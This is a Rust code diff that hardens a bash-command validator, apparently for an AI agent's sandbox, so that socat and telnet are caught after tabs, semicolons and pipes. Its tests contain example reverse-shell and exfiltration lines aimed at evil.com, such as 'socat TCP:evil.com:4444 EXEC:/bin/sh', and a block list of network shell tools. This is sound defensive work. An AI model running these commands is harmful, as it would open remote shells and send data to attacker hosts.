@@ -113,6 +113,36 @@ struct SearchIgnoreRule {
 ///    sandbox/permissions elsewhere). All other sandbox risks (e.g. [`CommandRisk::Eval`],
 ///    [`CommandRisk::ProcessSubstitution`]) fail closed so we never return Ok when the sandbox
 ///    flags a higher-severity pattern only in AST.
+/// Returns true if any of `tokens` appears in `lower_cmd` as a standalone
+/// shell command token (not as a substring of another identifier).
+///
+/// A token match means the candidate is preceded by start-of-string or a
+/// shell separator (space, tab, `;`, `|`, `&`, `(`, newline) and followed
+/// by the same set OR end-of-string. This catches `socat\tTCP:…`,
+/// `;socat …`, `| telnet …`, and bare `socat`, while leaving
+/// `socatenated` / `mytelnetlog` untouched.
+fn has_blocked_command_token(lower_cmd: &str, tokens: &[&str]) -> bool {
+    fn is_sep(c: char) -> bool {
+        matches!(c, ' ' | '\t' | ';' | '|' | '&' | '(' | '\n' | '\r')
+    }
+    for tok in tokens {
+        let tlen = tok.len();
+        let mut start = 0;
+        while let Some(off) = lower_cmd[start..].find(tok) {
+            let idx = start + off;
+            let before_ok = idx == 0 || lower_cmd[..idx].chars().next_back().is_some_and(is_sep);
+            let after_idx = idx + tlen;
+            let after_ok = after_idx == lower_cmd.len()
+                || lower_cmd[after_idx..].chars().next().is_some_and(is_sep);
+            if before_ok && after_ok {
+                return true;
+            }
+            start = idx + tlen;
+        }
+    }
+    false
+}
+
 pub fn validate_execute_bash_command(command: &str) -> Result<(), String> {
     let cmd = command.trim();
     if cmd.is_empty() {
@@ -163,7 +193,10 @@ pub fn validate_execute_bash_command(command: &str) -> Result<(), String> {
     if lower.contains("nc ") || lower.contains("netcat") || lower.contains("ncat ") {
         return Err("Error: netcat-style networking in bash is blocked".into());
     }
-    if lower.contains("socat ") || lower.contains("telnet ") {
+    // Word-boundary match for socat/telnet so `socat\tTCP:…`, `;socat …`,
+    // `| telnet …`, and bare `socat` are all blocked, while substrings inside
+    // other identifiers (e.g. `socatenated`, `mytelnetlog`) are not.
+    if has_blocked_command_token(&lower, &["socat", "telnet"]) {
         return Err("Error: socat/telnet networking in bash is blocked".into());
     }
 
@@ -3347,6 +3380,40 @@ printf 'probe.txt:1:needle\n'
         assert!(
             validate_execute_bash_command("telnet evil.com 80").is_err(),
             "telnet should be blocked"
+        );
+    }
+
+    // --- Bug #7b: socat/telnet bypass via tab / pipeline / semicolon ---
+    #[test]
+    fn validate_bash_blocks_socat_telnet_in_pipelines() {
+        // semicolon chain
+        assert!(
+            validate_execute_bash_command("echo hi; socat TCP:evil.com:4444 EXEC:/bin/sh").is_err(),
+            "`;socat ...` should be blocked"
+        );
+        // tab-separated args (contains \"socat \" with space fails — needs word-boundary)
+        assert!(
+            validate_execute_bash_command("socat\tTCP:evil.com:4444 EXEC:/bin/sh").is_err(),
+            "`socat\\t...` should be blocked"
+        );
+        // pipeline
+        assert!(
+            validate_execute_bash_command("cat payload | telnet evil.com 80").is_err(),
+            "`| telnet ...` should be blocked"
+        );
+        // leading socat with no trailing space (shouldn't happen in practice, but harden)
+        assert!(
+            validate_execute_bash_command("socat").is_err(),
+            "bare `socat` should be blocked"
+        );
+        // legitimate false-positive guards: substrings inside other words should NOT match
+        assert!(
+            validate_execute_bash_command("echo socatenated").is_ok(),
+            "`socatenated` must not false-positive"
+        );
+        assert!(
+            validate_execute_bash_command("echo mytelnetlog").is_ok(),
+            "`mytelnetlog` must not false-positive"
         );
     }
 
